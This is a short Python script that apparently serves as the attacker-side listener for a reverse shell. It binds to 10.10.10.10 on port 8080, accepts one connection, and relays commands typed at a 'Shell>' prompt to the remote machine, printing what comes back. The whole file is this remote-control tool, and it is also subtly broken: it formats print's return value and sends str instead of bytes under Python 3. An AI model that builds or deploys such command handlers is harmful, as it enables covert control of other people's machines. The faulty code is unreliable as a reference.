import socket


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.10.10.10", 8080))
    s.listen(1)
    print("tits")
    conn, addr = s.accept()
    print("[*] Connection from: %s") % addr
    s.close()

    while True:
        command = input("Shell> ")

        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print(conn.recv(1024))

if __name__ == "__main__":
    connect()
